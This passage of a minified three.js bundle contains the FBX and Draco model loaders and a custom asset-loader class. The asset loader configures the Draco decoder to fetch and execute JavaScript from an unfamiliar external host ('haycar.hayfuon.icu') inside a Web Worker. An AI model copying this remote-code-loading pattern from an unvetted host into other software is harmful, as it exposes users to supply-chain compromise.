tt(this.genBuffers(d).vertex,3);p.name=r||i.attrName,n.applyToBufferAttribute(p),e.morphAttributes.position.push(p)},parseNormals:function(e){var t=e.MappingInformationType,i=e.ReferenceInformationType,n=e.Normals.a,r=[];return"IndexToDirect"===i&&("NormalIndex"in e?r=e.NormalIndex.a:"NormalsIndex"in e&&(r=e.NormalsIndex.a)),{dataSize:3,buffer:n,indices:r,mappingType:t,referenceType:i}},parseUVs:function(e){var t=e.MappingInformationType,i=e.ReferenceInformationType,n=e.UV.a,r=[];return"IndexToDirect"===i&&(r=e.UVIndex.a),{dataSize:2,buffer:n,indices:r,mappingType:t,referenceType:i}},parseVertexColors:function(e){var t=e.MappingInformationType,i=e.ReferenceInformationType,n=e.Colors.a,r=[];return"IndexToDirect"===i&&(r=e.ColorIndex.a),{dataSize:4,buffer:n,indices:r,mappingType:t,referenceType:i}},parseMaterialIndices:function(e){var t=e.MappingInformationType,i=e.ReferenceInformationType;if("NoMappingInformation"===t)return{dataSize:1,buffer:[0],indices:[0],mappingType:"AllSame",referenceType:i};for(var n=e.Materials.a,r=[],o=0;o<n.length;++o)r.push(o);return{dataSize:1,buffer:n,indices:r,mappingType:t,referenceType:i}},parseNurbsGeometry:function(e){if(void 0===Cf)return console.error("THREE.FBXLoader: The loader relies on NURBSCurve for any nurbs present in the model. Nurbs will show up as empty geometry."),new dt;var t=parseInt(e.Order);if(isNaN(t))return console.error("THREE.FBXLoader: Invalid Order %s given for geometry ID: %s",e.Order,e.id),new dt;for(var i,n,r=t-1,o=e.KnotVector.a,a=[],s=e.Points.a,c=0,l=s.length;c<l;c+=4)a.push((new T).fromArray(s,c));if("Closed"===e.Form)a.push(a[0]);else if("Periodic"===e.Form){i=r,n=o.length-1-i;for(c=0;c<r;++c)a.push(a[c])}var h=new Cf(r,o,a,i,n).getPoints(7*a.length),u=new Float32Array(3*h.length);h.forEach((function(e,t){e.toArray(u,3*t)}));var d=new dt;return d.addAttribute("position",new Xe(u,3)),d}},a.prototype={constructor:a,parse:function(){var e=[],t=this.parseClips();if(void 0!==t)for(var i in t){var n=t[i],r=this.addClip(n);e.push(r)}return e},parseClips:function(){if(void 0!==e.Objects.AnimationCurve){var t=this.parseAnimationCurveNodes();this.parseAnimationCurves(t);var i=this.parseAnimationLayers(t);return this.parseAnimStacks(i)}},parseAnimationCurveNodes:function(){var t=e.Objects.AnimationCurveNode,i=new Map;for(var n in t){var r=t[n];if(null!==r.attrName.match(/S|R|T|DeformPercent/)){var o={id:r.id,attr:r.attrName,curves:{}};i.set(o.id,o)}}return i},parseAnimationCurves:function(i){var n=e.Objects.AnimationCurve;for(var r in n){var o={id:n[r].id,times:n[r].KeyTime.a.map(d),values:n[r].KeyValueFloat.a},a=t.get(o.id);if(void 0!==a){var s=a.parents[0].ID,c=a.parents[0].relationship;c.match(/X/)?i.get(s).curves.x=o:c.match(/Y/)?i.get(s).curves.y=o:c.match(/Z/)?i.get(s).curves.z=o:c.match(/d|DeformPercent/)&&i.has(s)&&(i.get(s).curves.morph=o)}}},parseAnimationLayers:function(n){var r=e.Objects.AnimationLayer,o=new Map;for(var a in r){var s=[],c=t.get(parseInt(a));if(void 0!==c)c.children.forEach((function(r,o){if(n.has(r.ID)){var a=n.get(r.ID);if(void 0!==a.curves.x||void 0!==a.curves.y||void 0!==a.curves.z){if(void 0===s[o])if(void 0!==(p=t.get(r.ID).parents.filter((function(e){return void 0!==e.relationship}))[0].ID)){var c={modelName:(l=e.Objects.Model[p.toString()]).attrName?Ic.sanitizeNodeName(l.attrName):"",ID:l.id,initialPosition:[0,0,0],initialRotation:[0,0,0],initialScale:[1,1,1]};i.traverse((function(e){e.ID===l.id&&(c.transform=e.matrix,e.userData.transformData&&(c.eulerOrder=e.userData.transformData.eulerOrder))})),c.transform||(c.transform=new B),"PreRotation"in l&&(c.preRotation=l.PreRotation.value),"PostRotation"in l&&(c.postRotation=l.PostRotation.value),s[o]=c}s[o]&&(s[o][a.attr]=a)}else if(void 0!==a.curves.morph){if(void 0===s[o]){var l,h=t.get(r.ID).parents.filter((function(e){return void 0!==e.relationship}))[0].ID,u=t.get(h).parents[0].ID,d=t.get(u).parents[0].ID,p=t.get(d).parents[0].ID;c={modelName:(l=e.Objects.Model[p]).attrName?Ic.sanitizeNodeName(l.attrName):"",morphName:e.Objects.Deformer[h].attrName};s[o]=c}s[o][a.attr]=a}}})),o.set(parseInt(a),s)}return o},parseAnimStacks:function(i){var n=e.Objects.AnimationStack,r={};for(var o in n){var a=t.get(parseInt(o)).children;a.length>1&&console.warn("THREE.FBXLoader: Encountered an animation stack with multiple layers, this is currently not supported. Ignoring subsequent layers.");var s=i.get(a[0].ID);r[o]={name:n[o].attrName,layer:s}}return r},addClip:function(e){var t=[],i=this;return e.layer.forEach((function(e){t=t.concat(i.generateTracks(e))})),new Wa(e.name,-1,t)},generateTracks:function(e){var t=[],i=new y,n=new m,r=new y;if(e.transform&&e.transform.decompose(i,n,r),i=i.toArray(),n=(new F).setFromQuaternion(n,e.eulerOrder).toArray(),r=r.toArray(),void 0!==e.T&&Object.keys(e.T.curves).length>0){var o=this.generateVectorTrack(e.modelName,e.T.curves,i,"position");void 0!==o&&t.push(o)}if(void 0!==e.R&&Object.keys(e.R.curves).length>0){var a=this.generateRotationTrack(e.modelName,e.R.curves,n,e.preRotation,e.postRotation,e.eulerOrder);void 0!==a&&t.push(a)}if(void 0!==e.S&&Object.keys(e.S.curves).length>0){var s=this.generateVectorTrack(e.modelName,e.S.curves,r,"scale");void 0!==s&&t.push(s)}if(void 0!==e.DeformPercent){var c=this.generateMorphTrack(e);void 0!==c&&t.push(c)}return t},generateVectorTrack:function(e,t,i,n){var r=this.getTimesForAllAxes(t);return new Ga(e+"."+n,r,this.getKeyframeTrackValues(r,t,i))},generateRotationTrack:function(e,t,i,n,r,o){void 0!==t.x&&(this.interpolateRotations(t.x),t.x.values=t.x.values.map(p.degToRad)),void 0!==t.y&&(this.interpolateRotations(t.y),t.y.values=t.y.values.map(p.degToRad)),void 0!==t.z&&(this.interpolateRotations(t.z),t.z.values=t.z.values.map(p.degToRad));var a=this.getTimesForAllAxes(t),s=this.getKeyframeTrackValues(a,t,i);void 0!==n&&((n=n.map(p.degToRad)).push(o),n=(new F).fromArray(n),n=(new m).setFromEuler(n)),void 0!==r&&((r=r.map(p.degToRad)).push(o),r=(new F).fromArray(r),r=(new m).setFromEuler(r).inverse());for(var c=new m,l=new F,h=[],u=0;u<s.length;u+=3)l.set(s[u],s[u+1],s[u+2],o),c.setFromEuler(l),void 0!==n&&c.premultiply(n),void 0!==r&&c.multiply(r),c.toArray(h,u/3*4);return new Va(e+".quaternion",a,h)},generateMorphTrack:function(e){var t=e.DeformPercent.curves.morph,n=t.values.map((function(e){return e/100})),r=i.getObjectByName(e.modelName).morphTargetDictionary[e.morphName];return new ja(e.modelName+".morphTargetInfluences["+r+"]",t.times,n)},getTimesForAllAxes:function(e){var t=[];return void 0!==e.x&&(t=t.concat(e.x.times)),void 0!==e.y&&(t=t.concat(e.y.times)),void 0!==e.z&&(t=t.concat(e.z.times)),t=t.sort((function(e,t){return e-t})).filter((function(e,t,i){return i.indexOf(e)==t}))},getKeyframeTrackValues:function(e,t,i){var n=i,r=[],o=-1,a=-1,s=-1;return e.forEach((function(e){if(t.x&&(o=t.x.times.indexOf(e)),t.y&&(a=t.y.times.indexOf(e)),t.z&&(s=t.z.times.indexOf(e)),-1!==o){var i=t.x.values[o];r.push(i),n[0]=i}else r.push(n[0]);if(-1!==a){var c=t.y.values[a];r.push(c),n[1]=c}else r.push(n[1]);if(-1!==s){var l=t.z.values[s];r.push(l),n[2]=l}else r.push(n[2])})),r},interpolateRotations:function(e){for(var t=1;t<e.values.length;t++){var i=e.values[t-1],n=e.values[t]-i,r=Math.abs(n);if(r>=180){for(var o=r/180,a=n/o,s=i+a,c=e.times[t-1],l=(e.times[t]-c)/o,h=c+l,u=[],d=[];h<e.times[t];)u.push(h),h+=l,d.push(s),s+=a;e.times=A(e.times,t,u),e.values=A(e.values,t,d)}}}},s.prototype={constructor:s,getPrevNode:function(){return this.nodeStack[this.currentIndent-2]},getCurrentNode:function(){return this.nodeStack[this.currentIndent-1]},getCurrentProp:function(){return this.currentProp},pushStack:function(e){this.nodeStack.push(e),this.currentIndent+=1},popStack:function(){this.nodeStack.pop(),this.currentIndent-=1},setCurrentProp:function(e,t){this.currentProp=e,this.currentPropName=t},parse:function(e){this.currentIndent=0,this.allNodes=new h,this.nodeStack=[],this.currentProp=[],this.currentPropName="";var t=this,i=e.split(/[\r\n]+/);return i.forEach((function(e,n){var r=e.match(/^[\s\t]*;/),o=e.match(/^[\s\t]*$/);if(!r&&!o){var a=e.match("^\\t{"+t.currentIndent+"}(\\w+):(.*){",""),s=e.match("^\\t{"+t.currentIndent+"}(\\w+):[\\s\\t\\r\\n](.*)"),c=e.match("^\\t{"+(t.currentIndent-1)+"}}");a?t.parseNodeBegin(e,a):s?t.parseNodeProperty(e,s,i[++n]):c?t.popStack():e.match(/^[^\s\t}]/)&&t.parseNodePropertyContinued(e)}})),this.allNodes},parseNodeBegin:function(e,t){var i=t[1].trim().replace(/^"/,"").replace(/"$/,""),n=t[2].split(",").map((function(e){return e.trim().replace(/^"/,"").replace(/"$/,"")})),r={name:i},o=this.parseNodeAttr(n),a=this.getCurrentNode();0===this.currentIndent?this.allNodes.add(i,r):i in a?("PoseNode"===i?a.PoseNode.push(r):void 0!==a[i].id&&(a[i]={},a[i][a[i].id]=a[i]),""!==o.id&&(a[i][o.id]=r)):"number"==typeof o.id?(a[i]={},a[i][o.id]=r):"Properties70"!==i&&(a[i]="PoseNode"===i?[r]:r),"number"==typeof o.id&&(r.id=o.id),""!==o.name&&(r.attrName=o.name),""!==o.type&&(r.attrType=o.type),this.pushStack(r)},parseNodeAttr:function(e){var t=e[0];""!==e[0]&&(t=parseInt(e[0]),isNaN(t)&&(t=e[0]));var i="",n="";return e.length>1&&(i=e[1].replace(/^(\w+)::/,""),n=e[2]),{id:t,name:i,type:n}},parseNodeProperty:function(e,t,i){var n=t[1].replace(/^"/,"").replace(/"$/,"").trim(),r=t[2].replace(/^"/,"").replace(/"$/,"").trim();"Content"===n&&","===r&&(r=i.replace(/"/g,"").replace(/,$/,"").trim());var o=this.getCurrentNode();if("Properties70"!==o.name){if("C"===n){var a=r.split(",").slice(1),s=parseInt(a[0]),c=parseInt(a[1]),l=r.split(",").slice(3);n="connections",function(e,t){for(var i=0,n=e.length,r=t.length;i<r;i++,n++)e[n]=t[i]}(r=[s,c],l=l.map((function(e){return e.trim().replace(/^"/,"")}))),void 0===o[n]&&(o[n]=[])}"Node"===n&&(o.id=r),n in o&&Array.isArray(o[n])?o[n].push(r):"a"!==n?o[n]=r:o.a=r,this.setCurrentProp(o,n),"a"===n&&","!==r.slice(-1)&&(o.a=M(r))}else this.parseNodeSpecialProperty(e,n,r)},parseNodePropertyContinued:function(e){var t=this.getCurrentNode();t.a+=e,","!==e.slice(-1)&&(t.a=M(t.a))},parseNodeSpecialProperty:function(e,t,i){var n=i.split('",').map((function(e){return e.trim().replace(/^\"/,"").replace(/\s/,"_")})),r=n[0],o=n[1],a=n[2],s=n[3],c=n[4];switch(o){case"int":case"enum":case"bool":case"ULongLong":case"double":case"Number":case"FieldOfView":c=parseFloat(c);break;case"Color":case"ColorRGB":case"Vector3D":case"Lcl_Translation":case"Lcl_Rotation":case"Lcl_Scaling":c=M(c)}this.getPrevNode()[r]={type:o,type2:a,flag:s,value:c},this.setCurrentProp(this.getPrevNode(),r)}},c.prototype={constructor:c,parse:function(e){var t=new l(e);t.skip(23);var i=t.getUint32();console.log("THREE.FBXLoader: FBX binary version: "+i);for(var n=new h;!this.endOfContent(t);){var r=this.parseNode(t,i);null!==r&&n.add(r.name,r)}return n},endOfContent:function(e){return e.size()%16==0?(e.getOffset()+160+16&-16)>=e.size():e.getOffset()+160+16>=e.size()},parseNode:function(e,t){var i={},n=t>=7500?e.getUint64():e.getUint32(),r=t>=7500?e.getUint64():e.getUint32(),o=(t>=7500?e.getUint64():e.getUint32(),e.getUint8()),a=e.getString(o);if(0===n)return null;for(var s=[],c=0;c<r;c++)s.push(this.parseProperty(e));var l=s.length>0?s[0]:"",h=s.length>1?s[1]:"",u=s.length>2?s[2]:"";for(i.singleProperty=1===r&&e.getOffset()===n;n>e.getOffset();){var d=this.parseNode(e,t);null!==d&&this.parseSubNode(a,i,d)}return i.propertyList=s,"number"==typeof l&&(i.id=l),""!==h&&(i.attrName=h),""!==u&&(i.attrType=u),""!==a&&(i.name=a),i},parseSubNode:function(e,t,i){if(!0===i.singleProperty){var n=i.propertyList[0];Array.isArray(n)?(t[i.name]=i,i.a=n):t[i.name]=n}else if("Connections"===e&&"C"===i.name){var r=[];i.propertyList.forEach((function(e,t){0!==t&&r.push(e)})),void 0===t.connections&&(t.connections=[]),t.connections.push(r)}else if("Properties70"===i.name){Object.keys(i).forEach((function(e){t[e]=i[e]}))}else if("Properties70"===e&&"P"===i.name){var o,a=i.propertyList[0],s=i.propertyList[1],c=i.propertyList[2],l=i.propertyList[3];0===a.indexOf("Lcl ")&&(a=a.replace("Lcl ","Lcl_")),0===s.indexOf("Lcl ")&&(s=s.replace("Lcl ","Lcl_")),o="Color"===s||"ColorRGB"===s||"Vector"===s||"Vector3D"===s||0===s.indexOf("Lcl_")?[i.propertyList[4],i.propertyList[5],i.propertyList[6]]:i.propertyList[4],t[a]={type:s,type2:c,flag:l,value:o}}else void 0===t[i.name]?"number"==typeof i.id?(t[i.name]={},t[i.name][i.id]=i):t[i.name]=i:"PoseNode"===i.name?(Array.isArray(t[i.name])||(t[i.name]=[t[i.name]]),t[i.name].push(i)):void 0===t[i.name][i.id]&&(t[i.name][i.id]=i)},parseProperty:function(e){var t=e.getString(1);switch(t){case"C":return e.getBoolean();case"D":return e.getFloat64();case"F":return e.getFloat32();case"I":return e.getInt32();case"L":return e.getInt64();case"R":var i=e.getUint32();return e.getArrayBuffer(i);case"S":i=e.getUint32();return e.getString(i);case"Y":return e.getInt16();case"b":case"c":case"d":case"f":case"i":case"l":var n=e.getUint32(),r=e.getUint32(),o=e.getUint32();if(0===r)switch(t){case"b":case"c":return e.getBooleanArray(n);case"d":return e.getFloat64Array(n);case"f":return e.getFloat32Array(n);case"i":return e.getInt32Array(n);case"l":return e.getInt64Array(n)}void 0===Ef&&console.error("THREE.FBXLoader: External library Inflate.min.js required, obtain or import from https://github.com/imaya/zlib.js");var a=new l(new Ef.Inflate(new Uint8Array(e.getArrayBuffer(o))).decompress().buffer);switch(t){case"b":case"c":return a.getBooleanArray(n);case"d":return a.getFloat64Array(n);case"f":return a.getFloat32Array(n);case"i":return a.getInt32Array(n);case"l":return a.getInt64Array(n)}default:throw new Error("THREE.FBXLoader: Unknown property type "+t)}}},l.prototype={constructor:l,getOffset:function(){return this.offset},size:function(){return this.dv.buffer.byteLength},skip:function(e){this.offset+=e},getBoolean:function(){return 1==(1&this.getUint8())},getBooleanArray:function(e){for(var t=[],i=0;i<e;i++)t.push(this.getBoolean());return t},getUint8:function(){var e=this.dv.getUint8(this.offset);return this.offset+=1,e},getInt16:function(){var e=this.dv.getInt16(this.offset,this.littleEndian);return this.offset+=2,e},getInt32:function(){var e=this.dv.getInt32(this.offset,this.littleEndian);return this.offset+=4,e},getInt32Array:function(e){for(var t=[],i=0;i<e;i++)t.push(this.getInt32());return t},getUint32:function(){var e=this.dv.getUint32(this.offset,this.littleEndian);return this.offset+=4,e},getInt64:function(){var e,t;return this.littleEndian?(e=this.getUint32(),t=this.getUint32()):(t=this.getUint32(),e=this.getUint32()),2147483648&t?(t=4294967295&~t,4294967295===(e=4294967295&~e)&&(t=t+1&4294967295),-(4294967296*t+(e=e+1&4294967295))):4294967296*t+e},getInt64Array:function(e){for(var t=[],i=0;i<e;i++)t.push(this.getInt64());return t},getUint64:function(){var e,t;return this.littleEndian?(e=this.getUint32(),t=this.getUint32()):(t=this.getUint32(),e=this.getUint32()),4294967296*t+e},getFloat32:function(){var e=this.dv.getFloat32(this.offset,this.littleEndian);return this.offset+=4,e},getFloat32Array:function(e){for(var t=[],i=0;i<e;i++)t.push(this.getFloat32());return t},getFloat64:function(){var e=this.dv.getFloat64(this.offset,this.littleEndian);return this.offset+=8,e},getFloat64Array:function(e){for(var t=[],i=0;i<e;i++)t.push(this.getFloat64());return t},getArrayBuffer:function(e){var t=this.dv.buffer.slice(this.offset,this.offset+e);return this.offset+=e,t},getString:function(e){for(var t=[],i=0;i<e;i++)t[i]=this.getUint8();var n=t.indexOf(0);return n>=0&&(t=t.slice(0,n)),Us(new Uint8Array(t))}},h.prototype={constructor:h,add:function(e,t){this[e]=t}};var f=[];function v(e,t,i,n){var r;switch(n.mappingType){case"ByPolygonVertex":r=e;break;case"ByPolygon":r=t;break;case"ByVertice":r=i;break;case"AllSame":r=n.indices[0];break;default:console.warn("THREE.FBXLoader: unknown attribute mapping type "+n.mappingType)}"IndexToDirect"===n.referenceType&&(r=n.indices[r]);var o=r*n.dataSize,a=o+n.dataSize;return function(e,t,i,n){for(var r=i,o=0;r<n;r++,o++)e[o]=t[r];return e}(f,n.buffer,o,a)}var g=new F,b=new y;function w(e){var t,i=new B,n=new B,r=new B,o=new B,a=new B,s=new B,c=new B,l=new B,h=new B,u=new B,d=new B,f=e.inheritType?e.inheritType:0;(e.translation&&i.setPosition(b.fromArray(e.translation)),e.preRotation)&&((t=e.preRotation.map(p.degToRad)).push(e.eulerOrder),n.makeRotationFromEuler(g.fromArray(t)));e.rotation&&((t=e.rotation.map(p.degToRad)).push(e.eulerOrder),r.makeRotationFromEuler(g.fromArray(t)));e.postRotation&&((t=e.postRotation.map(p.degToRad)).push(e.eulerOrder),o.makeRotationFromEuler(g.fromArray(t)));e.scale&&a.scale(b.fromArray(e.scale)),e.scalingOffset&&c.setPosition(b.fromArray(e.scalingOffset)),e.scalingPivot&&s.setPosition(b.fromArray(e.scalingPivot)),e.rotationOffset&&l.setPosition(b.fromArray(e.rotationOffset)),e.rotationPivot&&h.setPosition(b.fromArray(e.rotationPivot)),e.parentMatrixWorld&&(u=e.parentMatrixWorld);var m=n.multiply(r).multiply(o),v=new B;u.extractRotation(v);var y,w,x,_,M=new B;if(M.copyPosition(u),x=M.getInverse(M).multiply(u),w=v.getInverse(v).multiply(x),y=a,0===f)_=v.multiply(m).multiply(w).multiply(y);else if(1===f)_=v.multiply(w).multiply(m).multiply(y);else{var S=(new B).copy(a),T=w.multiply(S.getInverse(S));_=v.multiply(m).multiply(T).multiply(y)}var E=i.multiply(l).multiply(h).multiply(n).multiply(r).multiply(o).multiply(h.getInverse(h)).multiply(c).multiply(s).multiply(a).multiply(s.getInverse(s)),A=(new B).copyPosition(E),C=u.multiply(A);return d.copyPosition(C),E=d.multiply(_)}function _(e){var t=["ZYX","YZX","XZY","ZXY","YXZ","XYZ"];return 6===(e=e||0)?(console.warn("THREE.FBXLoader: unsupported Euler Order: Spherical XYZ. Animations and rotations may be incorrect."),t[0]):t[e]}function M(e){return e.split(",").map((function(e){return parseFloat(e)}))}function E(e,t,i){return void 0===t&&(t=0),void 0===i&&(i=e.byteLength),Us(new Uint8Array(e,t,i))}function A(e,t,i){return e.slice(0,t).concat(i).concat(e.slice(t))}return n}(),Lf=function(e){Qa.call(this,e),this.decoderPath="",this.decoderConfig={},this.decoderBinary=null,this.decoderPending=null,this.workerLimit=4,this.workerPool=[],this.workerNextTaskID=1,this.workerSourceURL="",this.defaultAttributeIDs={position:"POSITION",normal:"NORMAL",color:"COLOR",uv:"TEX_COORD"},this.defaultAttributeTypes={position:"Float32Array",normal:"Float32Array",color:"Float32Array",uv:"Float32Array"}};function Rf(e){return(Rf="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e})(e)}function kf(e,t){for(var i=0;i<t.length;i++){var n=t[i];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}function Of(e,t){return!t||"object"!==Rf(t)&&"function"!=typeof t?function(e){if(void 0===e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return e}(e):t}function If(e){return(If=Object.setPrototypeOf?Object.getPrototypeOf:function(e){return e.__proto__||Object.getPrototypeOf(e)})(e)}function Bf(e,t){return(Bf=Object.setPrototypeOf||function(e,t){return e.__proto__=t,e})(e,t)}Lf.prototype=Object.assign(Object.create(Qa.prototype),{constructor:Lf,setDecoderPath:function(e){return this.decoderPath=e,this},setDecoderConfig:function(e){return this.decoderConfig=e,this},setWorkerLimit:function(e){return this.workerLimit=e,this},setVerbosity:function(){console.warn("THREE.DRACOLoader: The .setVerbosity() method has been removed.")},setDrawMode:function(){console.warn("THREE.DRACOLoader: The .setDrawMode() method has been removed.")},setSkipDequantization:function(){console.warn("THREE.DRACOLoader: The .setSkipDequantization() method has been removed.")},load:function(e,t,i,n){var r=new Ja(this.manager);r.setPath(this.path),r.setResponseType("arraybuffer"),"use-credentials"===this.crossOrigin&&r.setWithCredentials(!0),r.load(e,e=>{var i={attributeIDs:this.defaultAttributeIDs,attributeTypes:this.defaultAttributeTypes,useUniqueIDs:!1};this.decodeGeometry(e,i).then(t).catch(n)},i,n)},decodeDracoFile:function(e,t,i,n){var r={attributeIDs:i||this.defaultAttributeIDs,attributeTypes:n||this.defaultAttributeTypes,useUniqueIDs:!!i};this.decodeGeometry(e,r).then(t)},decodeGeometry:function(e,t){var i,n=this.workerNextTaskID++,r=e.byteLength;for(var o in t.attributeTypes){var a=t.attributeTypes[o];void 0!==a.BYTES_PER_ELEMENT&&(t.attributeTypes[o]=a.name)}var s=this._getWorker(n,r).then(r=>(i=r,new Promise((r,o)=>{i._callbacks[n]={resolve:r,reject:o},i.postMessage({type:"decode",id:n,taskConfig:t,buffer:e},[e])}))).then(e=>this._createGeometry(e.geometry));return s.finally(()=>{i&&n&&this._releaseTask(i,n)}),s},_createGeometry:function(e){var t=new dt;e.index&&t.setIndex(new Xe(e.index.array,1));for(var i=0;i<e.attributes.length;i++){var n=e.attributes[i],r=n.name,o=n.array,a=n.itemSize;t.addAttribute(r,new Xe(o,a))}return t},_loadLibrary:function(e,t){var i=new Ja(this.manager);return i.setPath(this.decoderPath),i.setResponseType(t),new Promise((t,n)=>{i.load(e,t,void 0,n)})},_initDecoder:function(){if(this.decoderPending)return this.decoderPending;var e="object"!=typeof WebAssembly||"js"===this.decoderConfig.type,t=[];return e?t.push(this._loadLibrary("js/decoder.js","text")):(t.push(this._loadLibrary("js/wrapper.js","text")),t.push(this._loadLibrary("decoder.wasm","arraybuffer"))),this.decoderPending=Promise.all(t).then(t=>{var i=t[0];e||(this.decoderConfig.wasmBinary=t[1]);var n=Lf.DRACOWorker.toString(),r=["/* draco decoder */",i,"","/* worker */",n.substring(n.indexOf("{")+1,n.lastIndexOf("}"))].join("\n");this.workerSourceURL=URL.createObjectURL(new Blob([r]))}),this.decoderPending},_getWorker:function(e,t){return this._initDecoder().then(()=>{var i;this.workerPool.length<this.workerLimit?((i=new Worker(this.workerSourceURL))._callbacks={},i._taskCosts={},i._taskLoad=0,i.postMessage({type:"init",decoderConfig:this.decoderConfig}),i.onmessage=function(e){var t=e.data;switch(t.type){case"decode":i._callbacks[t.id].resolve(t);break;case"error":i._callbacks[t.id].reject(t);break;default:console.error('THREE.DRACOLoader: Unexpected message, "'+t.type+'"')}},this.workerPool.push(i)):this.workerPool.sort((function(e,t){return e._taskLoad>t._taskLoad?-1:1}));return(i=this.workerPool[this.workerPool.length-1])._taskCosts[e]=t,i._taskLoad+=t,i})},_releaseTask:function(e,t){e._taskLoad-=e._taskCosts[t],delete e._callbacks[t],delete e._taskCosts[t]},debug:function(){console.log("Task load: ",this.workerPool.map(e=>e._taskLoad))},dispose:function(){for(var e=0;e<this.workerPool.length;++e)this.workerPool[e].terminate();return this.workerPool.length=0,this}}),Lf.DRACOWorker=function(){var e,t;function i(e,t,i,n,r,o){var a,s,c=o.num_components(),l=i.num_points()*c;switch(r){case Float32Array:a=new e.DracoFloat32Array,t.GetAttributeFloatForAllPoints(i,o,a),s=new Float32Array(l);break;case Int8Array:a=new e.DracoInt8Array,t.GetAttributeInt8ForAllPoints(i,o,a),s=new Int8Array(l);break;case Int16Array:a=new e.DracoInt16Array,t.GetAttributeInt16ForAllPoints(i,o,a),s=new Int16Array(l);break;case Int32Array:a=new e.DracoInt32Array,t.GetAttributeInt32ForAllPoints(i,o,a),s=new Int32Array(l);break;case Uint8Array:a=new e.DracoUInt8Array,t.GetAttributeUInt8ForAllPoints(i,o,a),s=new Uint8Array(l);break;case Uint16Array:a=new e.DracoUInt16Array,t.GetAttributeUInt16ForAllPoints(i,o,a),s=new Uint16Array(l);break;case Uint32Array:a=new e.DracoUInt32Array,t.GetAttributeUInt32ForAllPoints(i,o,a),s=new Uint32Array(l);break;default:throw new Error("THREE.DRACOLoader: Unexpected attribute type.")}for(var h=0;h<l;h++)s[h]=a.GetValue(h);return e.destroy(a),{name:n,array:s,itemSize:c}}onmessage=function(n){var r=n.data;switch(r.type){case"init":e=r.decoderConfig,t=new Promise((function(t){e.onModuleLoaded=function(e){t({draco:e})},DracoDecoderModule(e)}));break;case"decode":var o=r.buffer,a=r.taskConfig;t.then(e=>{var t=e.draco,n=new t.Decoder,s=new t.DecoderBuffer;s.Init(new Int8Array(o),o.byteLength);try{var c=function(e,t,n,r){var o,a,s=r.attributeIDs,c=r.attributeTypes,l=t.GetEncodedGeometryType(n);if(l===e.TRIANGULAR_MESH)o=new e.Mesh,a=t.DecodeBufferToMesh(n,o);else{if(l!==e.POINT_CLOUD)throw new Error("THREE.DRACOLoader: Unexpected geometry type.");o=new e.PointCloud,a=t.DecodeBufferToPointCloud(n,o)}if(!a.ok()||0===o.ptr)throw new Error("THREE.DRACOLoader: Decoding failed: "+a.error_msg());var h={index:null,attributes:[]};for(var u in s){var d,p,f=self[c[u]];if(r.useUniqueIDs)p=s[u],d=t.GetAttributeByUniqueId(o,p);else{if(-1===(p=t.GetAttributeId(o,e[s[u]])))continue;d=t.GetAttribute(o,p)}h.attributes.push(i(e,t,o,u,f,d))}if(l===e.TRIANGULAR_MESH){for(var m=o.num_faces(),v=new Uint32Array(3*m),g=new e.DracoInt32Array,y=0;y<m;++y){t.GetFaceFromMesh(o,y,g);for(var b=0;b<3;++b)v[3*y+b]=g.GetValue(b)}h.index={array:v,itemSize:1},e.destroy(g)}return e.destroy(o),h}(t,n,s,a),l=c.attributes.map(e=>e.array.buffer);c.index&&l.push(c.index.array.buffer),self.postMessage({type:"decode",id:r.id,geometry:c},l)}catch(e){console.error(e),self.postMessage({type:"error",id:r.id,error:e.message})}finally{t.destroy(s),t.destroy(n)}})}}},Lf.setDecoderPath=function(){console.warn("THREE.DRACOLoader: The .setDecoderPath() method has been removed. Use instance methods.")},Lf.setDecoderConfig=function(){console.warn("THREE.DRACOLoader: The .setDecoderConfig() method has been removed. Use instance methods.")},Lf.releaseDecoderModule=function(){console.warn("THREE.DRACOLoader: The .releaseDecoderModule() method has been removed. Use instance methods.")},Lf.getDecoderModule=function(){console.warn("THREE.DRACOLoader: The .getDecoderModule() method has been removed. Use instance methods.")};var Df=function(e){function t(){var e;return function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t),(e=Of(this,If(t).call(this))).setLoaders(),e.toLoad=0,e.loaded=0,e.items={},e}var i,n,r;return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function");e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,writable:!0,configurable:!0}}),t&&Bf(e,t)}(t,e),i=t,(n=[{key:"setLoaders",value:function(){var e=this;this.loaders=[],this.loaders.push({extensions:["jpg","png"],action:function(t){var i=new Image;i.addEventListener("load",(function(){e.fileLoadEnd(t,i)})),i.addEventListener("error",(function(){e.fileLoadEnd(t,i)})),i.src=t.source}});var t=new Lf;t.setDecoderPath("https://haycar.hayfuon.icu/static/"),t.setDecoderConfig({type:"js"}),this.loaders.push({extensions:["drc"],action:function(i){t.load(i.source,(function(t){e.fileLoadEnd(i,t),Lf.releaseDecoderModule()}))}});var i=new Vp;i.setDRACOLoader(t),this.loaders.push({extensions:["glb","gltf"],action:function(t){i.load(t.source,(function(i){e.fileLoadEnd(t,i)}))}});var n=new Pf;this.loaders.push({extensions:["fbx"],action:function(t){n.load(t.source,(function(i){e.fileLoadEnd(t,i)}))}})}},{key:"load",value:function(){var e=this,t=arguments.length>0&&void 0!==arguments[0]?arguments[0]:[],i=!0,n=!1,r=void 0;try{for(var o,a=t[Symbol.iterator]();!(i=(o=a.next()).done);i=!0){var s=o.value;this.toLoad++;var c=s.source.match(/\.([a-z]+)$/);void 0!==c[1]?function(){var t=c[1],i=e.loaders.find((function(e){return e.extensions.find((function(e){return e===t}))}));i?i.action(s):console.warn("Cannot found loader for ".concat(s))}():console.warn("Cannot found extension of ".concat(s))}}catch(e){n=!0,r=e}finally{try{i||null==a.return||a.return()}finally{if(n)throw 